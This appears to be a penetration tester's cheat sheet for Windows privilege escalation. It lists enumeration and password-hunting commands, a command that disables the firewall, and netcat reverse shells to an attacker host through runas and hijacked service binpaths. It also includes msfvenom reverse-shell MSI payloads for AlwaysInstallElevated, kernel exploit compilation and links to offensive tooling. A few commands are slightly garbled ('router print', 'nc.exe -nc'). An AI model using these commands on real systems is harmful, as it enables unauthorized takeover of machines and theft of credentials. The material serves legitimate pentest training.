# Windows Privilege Escalation

## **Enumeration**

* **OS Info Enumeration**
  * `systeminfo`
  * `hostname`
  * `echo %username%`
  * `wmic qfe -> check patches`
  * `wmic logicaldisk -> get other disk information`
* **User Enumeration**
  * `whoami`
  * `whoami /priv -> check user privilleges`
  * `whoami /groups -> check user groups`
  * `net user -> list all users`
  * `net user <username> -> check groups associated with a user`
  * `net localgroup -> Check all the local groups available`
  * `net localgroup <group name> -> List the members of the given localgroup`
* **Task | Service | Process Enumeration**
  * `sc queryex type= service (Lists all the service)`
  * `tasklist /SVC`
  * `tasklist`
  * `net start`
  * `DRIVERQUERY`
  * `wmic product get name, version, vendor`
* **Permission Enumeration**
  * C:\Program Files : icacls program\_name
  * icacls root.txt /grant \<username>:F (to grant permission to access file)
  * Check the PowerShell history file `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
  * Check stored usernames and passwords
    * `cmdkey /list`
* **Network based**
  * `ipconfig`
  * `ipconfig /all`
  * `arp -a`
  * `router print`
  * `netstat -ano`
* **Password Hunting**
  * ```
    findstr /si password *.txt *.ini *.config (try searching in different directories)
    dir /s *pass* == *cred* == *vnc* == *.config*
    dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
    where /R C:\ user.txt
    where /R C:\ *.ini
    ```
  * [Swisskyrepo for manual pwd enumeration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords)
* **AV / Firewall check / Service Enumeration**

```
sc query windefend 
netsh advfirewall firewall dump
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
netsh firewall show state (show firewall running or stopped)
netsh firewall show config (show firewall configuration)

netsh firewall set opmode disable # Disable firewall
```

* **Scheduled Tasks**

```
schtasks /query /fo LIST /v
```

* Mount Information
  * `mountvol`

## Escalation Techniques

**Service Account Priv Esc (Token Impersonation)**

* whoami /priv

**Run As :**

Use the `cmdkey` to list the stored credentials on the machine.

```
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Using `runas` with a provided set of credential.

```bash
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

**Access check :**

* `accesschk.exe -ucqv [service_name] /accepteula`
* `accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)`
* _**Find all weak folder permissions per drive.**_
  * `accesschk.exe /accepteula -uwdqs Users c:\`
  * `accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\`
* _**Find all weak file permissions per drive.**_
  * `accesschk.exe /accepteula -uwsv "Everyone" "C:\Program Files"`
  * `accesschk.exe /accepteula -uwqs Users c:\*.*`
  * `accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*`
* _**Powershell**_`:`

```
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

* _**Binary planting**_ ([https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services))
  * `sc qc [service_name] // for service properties`
  * `sc query [service_name] // for service status`
  * `sc config [service_name] binpath= "C:\Temp\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"`
  * `sc config [service_name] obj= ".\LocalSystem" password= ""`
  * `net start [service_name]`

**Unquoted Service Path Privilege Escalation**

*   [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

    ```
    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
    ```

#### PATH directories with weak permissions

```
C:\Temp> for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
C:\Temp> for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

C:\Temp> sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
C:\Temp> type Servicenames.txt
C:\Temp> FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
C:\Temp> FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

**Always Install Elevated :**

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 –f  msi > install.msi

C:> msiexec /quiet /qn /i  install.msi
```

**Kernel Exploits :**

* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
* run `systeminfo` | capture the output and run windows-exploit-suggester.py
* Compiling Kernel Exploits :

```
i686-w64-mingw32-gcc exploit.c -o exploit
```

or for 32 bit

```
i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32 
```

## **Automated Enumeration Tools**

**Powershell:**

* powershell -ep bypass
* load powershell (only in meterpreter)
* Sherlock ([https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock))
* [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) (PowerUp)

**EXE : (**[**https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#exe**](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#exe)**)**

* [ ] WinPeas \[ [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) ]
* [ ] Accesschk.exe \[[https://github.com/jivoi/pentest/blob/master/post\_win/accesschk\_exe](https://github.com/jivoi/pentest/blob/master/post\_win/accesschk\_exe)]
* [ ] PowerUp ([https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc))
* [ ] Seatbelt ([https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt))

**Other :** Windows Exploit Suggester ([https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester))

**Metasploit :**

* `getsystem`
* `run post/multi/recon/local_`_`exploit_`_`suggester`

**Resources :**

* [https://sushant747.gitbooks.io/total-oscp\*\*-\*\*guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
* [https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) (Win PrivEsc Checlist)
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
